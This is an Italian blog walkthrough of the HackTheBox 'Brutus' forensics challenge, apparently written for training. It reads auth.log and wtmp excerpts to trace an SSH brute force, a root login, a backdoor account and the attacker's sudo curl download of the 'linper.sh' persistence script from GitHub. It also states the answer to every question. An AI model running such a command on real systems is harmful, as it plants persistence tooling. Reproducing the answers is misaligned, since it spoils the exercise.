---
title: "Brutus Walkthrough"
description: "In questo Sherlock molto facile, ti familiarizzerai con i log Unix auth.log e wtmp. Esploreremo uno scenario in cui un server Confluence è stato compromesso tramite brute-force sul servizio SSH. Dopo aver ottenuto l’accesso, l’attaccante ha svolto ulteriori attività rilevabili tramite auth.log. Anche se auth.log viene usato principalmente per l’analisi dei brute-force, andremo a sfruttare tutto il suo potenziale nell’indagine, inclusi aspetti di privilege escalation, persistenza e persino visibilità sull’esecuzione di comandi."
author: dua2z3rr
date: 2025-09-14 1:00:00
categories: [Sherlocks]
tags: ["Area di Interesse: Common Applications", "Area di Interesse: Software & OS exploitation", "Area di Interesse: Authentication", "Area di Interesse: Web Application", "Area di Interesse: Vulnerability Assessment", "Vulnerabilità: Misconfiguration", "Vulnerabilità:  Hard-coded Credentials", "Codice: Java"]
image: /assets/img/brutus/brutus-resized.png"
---

## Introduzione

### Domande
1. Analizza il file auth.log. Qual è l’indirizzo IP usato dall’attaccante per effettuare il brute force?
2. I tentativi di brute force hanno avuto successo e l’attaccante ha ottenuto accesso a un account sul server. Qual è lo username dell’account compromesso?
3. Identifica il timestamp UTC in cui l’attaccante ha effettuato manualmente l’accesso al server e ha avviato una sessione terminale per raggiungere i suoi obiettivi. L’orario di login sarà diverso da quello di autenticazione e si trova nell’artifact wtmp.
4. Le sessioni SSH di login vengono tracciate e viene assegnato loro un numero di sessione al momento dell’accesso. Qual è il numero di sessione attribuito alla sessione dell’attaccante per l’utente dalla domanda 2?
5. L’attaccante ha aggiunto un nuovo utente come parte della sua strategia di persistenza sul server e ha concesso a questo account privilegi elevati. Qual è il nome di questo account?
6. Qual è l’ID della sub-tecnica MITRE ATT&CK utilizzata per la persistenza tramite creazione di un nuovo account?
7. A che ora è terminata la prima sessione SSH dell’attaccante secondo auth.log?
8. L’attaccante ha effettuato il login nel suo account backdoor e ha utilizzato i privilegi elevati per scaricare uno script. Qual è il comando completo eseguito usando sudo?

### Overview

Per completare lo sherlock ci viene fornita una zip. Questa zip contiene 3 file:

## Risposte

### Analizza il file auth.log. Qual è l’indirizzo IP usato dall’attaccante per effettuare il brute force?

Cominciamo a leggere dall'inizio il log file `auth.log`.

```log
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Invalid user admin from 65.2.161.68 port 46380
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Received disconnect from 65.2.161.68 port 46380:11: Bye Bye [preauth]
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Disconnected from invalid user admin 65.2.161.68 port 46380 [preauth]
Mar  6 06:31:31 ip-172-31-35-28 sshd[620]: error: beginning MaxStartups throttling
Mar  6 06:31:31 ip-172-31-35-28 sshd[620]: drop connection #10 from [65.2.161.68]:46482 on [172.31.35.28]:22 past MaxStartups
Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: Invalid user admin from 65.2.161.68 port 46392
Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: pam_unix(sshd:auth): check pass; user unknown
Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68
<SNIP>
```

Vediamo che i tentativi falliti di login provengono dallo stesso ip. Questi tentativi di login si presentano molte volte. Possiamo quindi assumere con certezza che l'IP dell'attaccante è quello.

Risposta: `65.2.161.68`

### I tentativi di brute force hanno avuto successo e l’attaccante ha ottenuto accesso a un account sul server. Qual è lo username dell’account compromesso?

Vediamo, proprio all'inizio del file (riga 12), che l'attacco ha avuto successo sull'utente **root**.

```log
<SNIP>
Mar  6 06:19:52 ip-172-31-35-28 sshd[1465]: AuthorizedKeysCommand /usr/share/ec2-instance-connect/eic_run_authorized_keys root SHA256:4vycLsDMzI+hyb9OP3wd18zIpyTqJmRq/QIZaLNrg8A failed, status 22
Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2
Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:19:54 ip-172-31-35-28 systemd-logind[411]: New session 6 of user root.
Mar  6 06:19:54 ip-172-31-35-28 systemd: pam_unix(systemd-user:session): session opened for user root(uid=0) by (uid=0)
<SNIP>
```

Risposta: `root`

### Identifica il timestamp UTC in cui l’attaccante ha effettuato manualmente l’accesso al server e ha avviato una sessione terminale per raggiungere i suoi obiettivi. L’orario di login sarà diverso da quello di autenticazione e si trova nell’artifact wtmp.

Utilizzando lo script di python `utmp.py` nella zip possiamo vedere le date dei login. Le prime volte in cui l'attaccante si è loggato all'utente **root** era grazie all'attacco brute force. Questo lo capiamo perchè si scollega instantaneamente. Perciò inseriamo la data di quando l'attaccante si è loggato come utente **root** l'ultima volta.

```txt
"RUN_LVL"	"53"	"~"	"~~"	"runlevel"	"6.2.0-1018-aws"	"0"	"0"	"0"	"2024/03/06 07:17:29"	"538024"	"0.0.0.0"
"USER"	"1583"	"pts/0"	"ts/0"	"root"	"203.101.190.9"	"0"	"0"	"0"	"2024/03/06 07:19:55"	"151913"	"203.101.190.9"
"USER"	"2549"	"pts/1"	"ts/1"	"root"	"65.2.161.68"	"0"	"0"	"0"	"2024/03/06 07:32:45"	"387923"	"65.2.161.68"
"DEAD"	"2491"	"pts/1"	""	""	""	"0"	"0"	"0"	"2024/03/06 07:37:24"	"590579"	"0.0.0.0"
"USER"	"2667"	"pts/1"	"ts/1"	"cyberjunkie"	"65.2.161.68"	"0"	"0"	"0"	"2024/03/06 07:37:35"	"475575"	"65.2.161.68"
```

> Ricordati che la risposta deve essere data nella timezone UTC. Visto che nel momento in cui ho usato lo script di python mi trovavo in Italia, devo tornare indietro di un ora.
{: .prompt-warning }

Risposta: `2024-03-06 06:32:45`

### Le sessioni SSH di login vengono tracciate e viene assegnato loro un numero di sessione al momento dell’accesso. Qual è il numero di sessione attribuito alla sessione dell’attaccante per l’utente dalla domanda 2?

Il numero di sezione si può leggere sotto l'entry del log che comunica il login con successo.

```log
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
```

La sessione che dobbiamo dare come risposta è sempre quella dove l'attaccante si collega manualmente.

Risposta: `37`

### L’attaccante ha aggiunto un nuovo utente come parte della sua strategia di persistenza sul server e ha concesso a questo account privilegi elevati. Qual è il nome di questo account?

Possiamo vedere sul file `auth.log` alla riga 338 la creazione da parte di root di un nuovo utente.

```log
Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
Mar  6 06:34:26 ip-172-31-35-28 passwd[2603]: pam_unix(passwd:chauthtok): password changed for cyberjunkie
Mar  6 06:34:31 ip-172-31-35-28 chfn[2605]: changed user 'cyberjunkie' information
```

Risposta: `cyberjunkie`

### Qual è l’ID della sub-tecnica MITRE ATT&CK utilizzata per la persistenza tramite creazione di un nuovo account?

Cerchiamo online per la risposta.

![Desktop View](/assets/img/brutus/brutus-mitre-research.png)

Per questa tecnica ci sono più sotto-tecniche basate sul tipo di account creato.

![Desktop View](/assets/img/brutus/brutus-mitre-sub-technique.png)

L'attaccante ha creato un utente locale.

Risposta: `T1136.001`

### A che ora è terminata la prima sessione SSH dell’attaccante secondo auth.log?

Per rispondere a questa domanda basta vedere la prima sessione dall'attaccante sul file wtmp (ci serve questo format per la risposta), e leggere quando è terminata (DEAD).

```txt
"USER"	"2549"	"pts/1"	"ts/1"	"root"	"65.2.161.68"	"0"	"0"	"0"	"2024/03/06 07:32:45"	"387923"	"65.2.161.68"
"DEAD"	"2491"	"pts/1"	""	""	""	"0"	"0"	"0"	"2024/03/06 07:37:24"	"590579"	"0.0.0.0"
```

Risposta: `2024-03-06 06:37:24`

### L’attaccante ha effettuato il login nel suo account backdoor e ha utilizzato i privilegi elevati per scaricare uno script. Qual è il comando completo eseguito usando sudo?

Controlliamo i comandi utilizzati dopo il login dell'account **cyberjunkie**.

```log
<SNIP>
Mar  6 06:39:01 ip-172-31-35-28 CRON[2764]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
Mar  6 06:39:38 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
Mar  6 06:39:39 ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed for user root
<SNIP>
```

Risposta: `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`
